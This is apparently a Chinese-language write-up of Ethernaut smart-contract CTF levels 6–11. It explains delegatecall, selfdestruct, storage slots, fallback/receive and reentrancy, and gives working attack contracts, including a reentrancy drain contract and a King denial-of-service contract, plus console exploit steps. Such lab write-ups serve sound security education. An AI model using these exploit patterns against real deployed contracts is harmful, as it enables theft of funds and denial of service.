### 第六题 Delegation
### 题目
获得合约的所有权.
### 提示
- 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.
- Fallback 方法
- 方法 ID
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;
    constructor(address _owner) {
        owner = _owner;
    }
    //将合约的拥有者地址设置为调用者的地址
    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    // delegate 是一个 Delegate 合约的实例
    Delegate delegate;

    constructor(address _delegateAddress) {
        //在构造函数中赋值，可以确保 delegate 变量在合约生命周期的开始就被正确设置。这有助于避免在合约运行过程中出现未初始化变量         //的情况，从而提高合约的可靠性和安全性。
        delegate = Delegate(_delegateAddress); //赋值
        owner = msg.sender;
    }

    //回退函数，当调用的函数不存在时会被触发。它使用delegatecall将调用委托给delegate合约。
    fallback() external {
        //address(delegate) 将该变量转换为 address 类型
        //msg.data 是当前调用的数据负载（calldata），包含了函数选择器和参数。它通常用于将调用的输入         //数据传递给目标合约。      
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            //this 关键字指代当前合约,但不会执行任何操作
            this;
        }
    }
}
```
### 知识点
1.delegatecall 
 Delegatecall 是本地合约委托调用其它合约的一种 Low-level 方法。当 A 合约使用 delegatecall 调用 B 合约的某 function，所有执行时的资料、状态改变都发生在 A 合约 storage 内而非 B 合约。相当于把B合约的所有函数复制到A合约，使用和修改的都是A合约的数据。
工作原理：
- 上下文共享：被调用合约（B）的代码在调用合约（A）的上下文中执行。这意味着所有的状态变量修改都发生在 A 合约的存储中，而不是 B 合约的存储中。
- msg.sender 和 msg.value 不变：调用合约的 msg.sender 和 msg.value 保持不变，这意味着调用者的信息不会改变。
注意事项：
- 存储布局：调用合约和被调用合约的存储布局必须一致，否则可能会导致意外的行为。
- 安全性：由于 delegatecall 允许被调用合约修改调用合约的状态，因此在使用时需要特别小心，以防止潜在的安全漏洞。
delegatecall和call的区别：
- 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。

- 而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。

可以这样理解：一个投资者（用户A）把他的资产（B合约的状态变量）都交给一个风险投资代理（C合约）来打理。执行的是风险投资代理的函数，但是改变的是资产的状态。  
delegatecall语法和call类似，也是：  
目标合约地址.delegatecall(二进制编码);  
其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：  
abi.encodeWithSignature("函数签名", 逗号分隔的具体参数)  
函数签名为"函数名（逗号分隔的参数类型）"。例如abi.encodeWithSignature("f(uint256,address)", _x, _addr)。  
资料来源https://github.com/AmazingAng/WTF-Solidity/tree/main/23_Delegatecall  
ABI编码  
https://github.com/AmazingAng/WTF-Solidity/tree/main/27_ABIEncode  
函数选择器 (Function Selector)  
https://github.com/AmazingAng/WTF-Solidity/tree/main/29_Selector  
sendTransaction  
sendTransaction函数可以用来发送以太币或调用智能合约中的函数。它的基本语法如下：  
```solidity
address.sendTransaction({
    from: senderAddress,  //from: 发送交易的地址
    to: receiverAddress, //to: 接收交易的地址，可以是一个普通地址或智能合约地址。
    value: amountInWei, // value: 发送的以太币数量，以Wei为单位。
    gas: gasLimit,      // gas: 交易的最大Gas限制。
    gasPrice: gasPriceInWei, // gasPrice: 每单位Gas的价格，以Wei为单位。
    data: encodedFunctionCall // data: 要调用的函数及其参数的编码数据。
});
```
### 解题思路
- 使用delegatecall调用delegate合约的pwn函数
- 而delegatecall在fallback函数里，需要想办法来触发它
- 只要直接调用Delegation合约，给予正确的calldata abi.encodeWithSignature("pwn()")，会因为找不到函数而进入回退函数，进而使用delegatecall(msg.data)调用Delegate 合约的 pwn() ，
### 解题过程
1.获取实例  
2.  var callData = web3.utils.keccak256("pwn()") // 准备好callData  
3.contract.sendTransaction({data:callData}); // 使用封装好的sendTransaction来发送data  
4.await.contract.owner() //检查合约的owner  
5.提交  
### 第七题 Force
### 题目
使合约的余额大于0
### 提示
- Fallback 方法
- 有时候攻击一个合约最好的方法是使用另一个合约.
- 阅读上方的帮助页面, "Beyond the console" 部分
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
 ```
### 知识点
fallback函数是一个特殊的函数，没有名字，不接受任何参数，也没有返回值。它的主要作用是在以下两种情况下被调用：
1. 调用不存在的函数：当一个合约接收到一个调用，但该调用的函数标识符在合约中没有匹配的函数时，fallback函数会被执行。
2. 接收以太币：当一个合约接收到以太币，但没有定义receive()函数时，fallback函数会被执行。
fallback函数的特点
- 可见性：fallback函数必须声明为external。
- 可支付性：如果希望fallback函数能够接收以太币，则必须将其声明为payable。
- Gas限制：当通过transfer或send调用时，fallback函数的Gas限制为2300(1)。
receive函数  
receive()函数是在合约收到ETH转账时被调用的函数。一个合约最多有一个receive()函数，声明方式与一般函数不一样，不需要function关键字：receive() external payable { ... }。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。
当合约接收ETH的时候，receive()会被触发。receive()最好不要执行太多的逻辑因为如果别人用send和transfer方法发送ETH的话，gas会限制在2300，receive()太复杂可能会触发Out of Gas报错  
fallback和receive的区别  
receive和fallback都能够用于接收ETH，他们触发的规则如下：  
触发fallback() 还是 receive()?    
           接收ETH  
              |  
         msg.data是空？  
            /  \  
          是    否  
          /      \  
receive()存在?   fallback()  
        / \  
       是  否  
      /     \  
receive()   fallback()  
简单来说，合约接收ETH时，msg.data为空且存在receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable。  
receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错（你仍可以通过带有payable的函数向合约发送ETH）。  
资料来源https://github.com/AmazingAng/WTF-Solidity/tree/main/19_Fallback  
Selfdestruct   
Selfdestruct 如同字面意思，用于销毁合约的函数，是唯一清除合约的方法，并且会将合约内剩余的所有 Ether 转移到指定的地址上。当调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。
使用方法：selfdestruct(address payable recipient); recipient是一个有效的ETH地址.  
### 解题思路
题目中的force合约没有任何代码，因此直接向合约转账会报错，所以只能使用Selfdestruct函数  
只需要在自己的合约中放入一些ETH，然后调用Selfdestruct函数，就可以对题目中的合约发动攻击了  
### 解题过程
1.获取实例中的合约地址  
2.在remix部署攻击合约  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract hackForce {
    uint public balance = 0;
    //存入ETH
    function deposit() external payable {
        balance += msg.value;
    }
    //自毁函数
    function hack(address payable _to) external payable {
        selfdestruct(_to);
    }
    
}
```
3.先调用deposit函数向攻击合约中转一些ETH  
4.调用攻击函数  
5.检查题目合约地址的ETH数量  
6.提交  
### 第八题 Vault
### 题目
打开 vault 来通过这一关!  
```solidity
### 源码
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
### 知识点
1.storage slot
- 在Solidity中，storage slot（存储槽）是以一种紧凑的方式存储合约状态变量的机制。每个存储槽的大小为256位（32字节），并且所有状态变量都存储在这些槽中。
- 存储槽：每个存储槽可以容纳256位的数据。Solidity的存储被组织成一个虚拟数组，这些槽由256位无符号整数索引。
- 紧凑存储：多个变量可以根据其大小和打包规则存储在同一个存储槽中。
- 基本类型：基本类型（如uint256、address等）直接存储在存储槽中。每个基本类型占用的字节数根据其类型确定。
- 打包规则：如果多个变量的总大小小于32字节，它们会被打包到同一个存储槽中。存储槽的第一项会以低位对齐的方式存储。
- 结构体和数组：结构体和数组总是从一个新的存储槽开始。结构体中的各个元素会根据上述规则紧密打包。
- 动态数组：由于大小不可预知，动态数组的元素存储位置通过keccak256哈希计算确定。数组的长度存储在其槽位中。
- 映射：映射的键值对存储位置也通过keccak256哈希计算。映射本身占用一个存储槽，但其内容存储在不同的位置。
2.getStorageAt  
eth_getStorageAt 是一个以太坊JSON-RPC方法，用于获取指定合约地址在特定存储位置的值  
eth_getStorageAt 方法需要三个参数：  
1. 地址：合约的地址（20字节）。  
2. 存储位置：存储槽的位置，以十六进制表示。  
3. 区块参数：区块号，可以是具体的区块号或特殊标签（如latest、earliest、pending等）。  
计算存储位置  
对于简单的状态变量，存储位置是直接的。但对于映射和动态数组，存储位置需要通过哈希计算。例如，对于映射 mapping(address => uint)，存储位置的计算方式如下：  
1. 将键和映射的存储槽位置拼接。  
2. 对拼接结果进行 keccak256 哈希计算。  
假设映射存储在槽 1，键为 0x391694e7e0b0cce554cb130d723a9d27458f9298，计算方式如下：
```solidity
JavaScript
var key = "000000000000000000000000391694e7e0b0cce554cb130d723a9d27458f9298" + "0000000000000000000000000000000000000000000000000000000000000001";
var storagePosition = web3.utils.sha3(key);
```
### 解题思路
密码是隐私的，且保存在链上，因此需要获取链上信息来取得密码   
locked是bool变量，占1个字节，8位；password变量是32字节；因此locked在第0个槽，password在第1个槽里  
只要获取槽的信息，即可解读出密码  
### 解题过程
1.获取实例合约地址  
2.``await web3.eth.getStorageAt("合约地址",1)``  //获取slot内的数据  
3.contract.unlock(第二步获取的数据) //填入密码  
4.提交  
### 第九题 King
### 题目
下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
这么有趣的游戏, 你的目标是攻破他.  
当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.  
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        //判断发送的数量大于当前账户的数量或者当前调用者是合约拥有者，否则交易回滚
        require(msg.value >= prize || msg.sender == owner);
        //将king地址转换为一个payable（可被接收ETH）地址，然后发送当前金额的以太到king地址
        payable(king).transfer(msg.value);
        //也就是如果转账成功，当前的调用者就成为新的king
        king = msg.sender;
        //更新奖池
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
### 解题思路
当转账ETH大于当前值时，会把这笔金额转给当前king的地址，如果这个地址不能接收ETH，或king地址一旦接收ETH就会触发交易回滚，则可以达到要求.
### 解题过程
1.获取实例合约地址  
2.创建king合约  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address _kingContractAddress) payable {
        // 确保我们有足够的以太币来成为国王
        require(msg.value > 0, "Need ETH to become king");
        
        // 调用King合约的receive函数来成为新的国王
        (bool success, ) = _kingContractAddress.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    // 不实现receive()或fallback()函数，使得合约无法接收以太币
}
```
3.在remix部署合约，附带0.01ETH转向题目中的合约地址  
4.检查king地址是否成功更换  
5.提交  
### 第十题 Re-entrancy
### 题目
偷走合约的所有资产.
### 提示
- 不可信的合约可以在你意料之外的地方执行代码.
- Fallback methods
- 抛出/恢复 bubbling
- 有的时候攻击一个合约的最好方式是使用另一个合约.
- 查看上方帮助页面, "Beyond the console" 部分
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    //将每个地址映射到一个 uint256 类型的余额
    mapping(address => uint256) public balances;
    //捐赠函数
    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }
    //提现函数
    function withdraw(uint256 _amount) public {
        //查调用者（msg.sender）的余额是否足够提取所请求的金额
        if (balances[msg.sender] >= _amount) {
            //向调用者装账_amount数量的ETH
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            //更新调用者的余额
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
### 知识点
1.重入攻击（Reentrancy Attack）
- 初始调用： 攻击者首先调用目标合约的一个函数（例如 withdraw 函数），该函数会向攻击者的地址发送以太币。
- 递归调用： 在目标合约向攻击者发送以太币之前，攻击者的合约会在 fallback 或 receive 函数中再次调用目标合约的 withdraw 函数。这种递归调用会在目标合约更新其内部状态（例如减少余额）之前发生。
- 重复提取： 由于目标合约的内部状态尚未更新，攻击者可以多次调用 withdraw 函数，每次都能成功提取以太币，直到目标合约的余额耗尽。
2.call函数
- 用法是接收方地址.call{value: 发送ETH数额}("")。  
示例： (bool success, bytes memory data) = address.call{value: amount, gas: gasLimit}(data);  
  address：目标合约的地址。value：发送的以太币数量（可选）。gas：指定的 gas 限制（可选）。data：调用的数据（通常是函数签名和参数编码后的数据）data参数设置为空会触发接收合约的fallback函数。  
- call()没有gas限制，可以支持对方合约fallback()或receive()函数实现复杂逻辑。
- call()如果转账失败，不会revert。
- call()的返回值是(bool, bytes)，其中bool代表着转账成功或失败，需要额外代码处理一下。
### 解题思路
题目中的call函数没有带data参数，会触发接收合约的fallback函数，因此可以使用合约调用withdraw函数来体现，在fallback函数中重复调用目标合约的withdraw函数，这样合约就会不断给我们所编写的合约转账直至余额为0。
### 解题过程
1.获取实例  
2.在remix部署合约，hack时带上1000000000000000个wei  
```solidity
contract HackRE {
    Reentrance re; 
    uint public attackAmount;
    //solidity0.7.0之前需要public，之后不需要了
    constructor (address payable aimAddr) public {
        //给re合约赋值
        re = Reentrance(aimAddr);
        attackAmount = address(re).balance;
    }

    //攻击函数，攻击时带上1000000000000000个wei
    function hack() public payable {
        //示在调用re.donate函数时，发送attackAmount数量的以太币。
        //address(this)-当前合约的地址
        re.donate{value: attackAmount}(address(this));
        re.withdraw(attackAmount);
    }
    receive() external payable {
        if(address(re).balance > 0) {
            re.withdraw(attackAmount);
        }
    }
}
```

3.getBalance(instance)查看实例余额
4.提交
### 第十一题 Elevator
### 题目
达到大楼顶楼
### 提示
- 有的时候 solidity 不是很擅长保存 promises.
- 这个 电梯 期待被用在一个 建筑 里.
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//定义了一个Building接口，声明了一个isLastFloor函数,用于检查给定的楼层是否是最高层
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    //是否到顶
    bool public top;
    //当前楼层
    uint256 public floor;

    function goTo(uint256 _floor) public {
        //创建一个 Building 类型的变量 building，并将其指向 msg.sender 地址。
        //Building(msg.sender) 是在进行类型转换。它将 msg.sender 地址转换为 Building 接口类型。
        Building building = Building(msg.sender);
        //调用 building 的 isLastFloor 函数，检查 _floor 是否是最后一层
        if (!building.isLastFloor(_floor)) {
            //当前楼层
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
### 解题思路
当building.isLastFloor(_floor)为false的时候，才可以进入if语句，然后top显然也会为false，因此需要外部合约来实现让building.isLastFloor(floor)两次出现不同的结果，即让第一次调用返回false，在第二次返回true。
因此需要实现一个Building接口满足以下条件：  
1. 有个isLastFloor函数  
2. 接受一个uint256的输入参数  
3. 返回一个bool  
### 解题过程
1.获取实例  
2.remix部署合约  
```solidity
contract Hack {
    Elevator public target;
    constructor(address _instance) {
    target = Elevator(_instance);
  }
  
   bool result = true;
   function isLastFloor(uint) public returns (bool){
        if(result == true) {
      result = false;
        }
        else {
            result = true;
        }
        return result;
    }
    function attack() public {
        target.goTo(10);
    }
}
```
3.hack  
4.提交  
